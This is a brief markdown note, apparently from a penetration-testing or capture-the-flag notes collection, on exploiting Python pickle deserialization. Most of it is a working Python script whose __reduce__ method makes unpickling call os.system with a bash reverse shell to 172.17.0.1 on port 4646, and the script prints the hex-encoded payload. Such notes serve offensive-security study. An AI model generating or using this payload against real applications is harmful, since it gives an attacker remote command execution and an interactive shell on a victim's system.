# DES-Pickle
Pickle: **Python obj** to **binary** (hex) and it does the reverse process.
- Probe this **Python** script to generate the **binary** (hex) serialized to use.
	```Python
	#!/usr/bin/python3
	
	import pickle
	import os
	import binascii
	
	class pickle_exploit(object):
	    def __reduce__ (self):
	        return (os.system, ('bash -c "bash -i >& /dev/tcp/172.17.0.1/4646 0>&1"',))
	
	if __name__ == "__main__":
	    print(binascii.hexlify(pickle.dumps(pickle_exploit())))
	```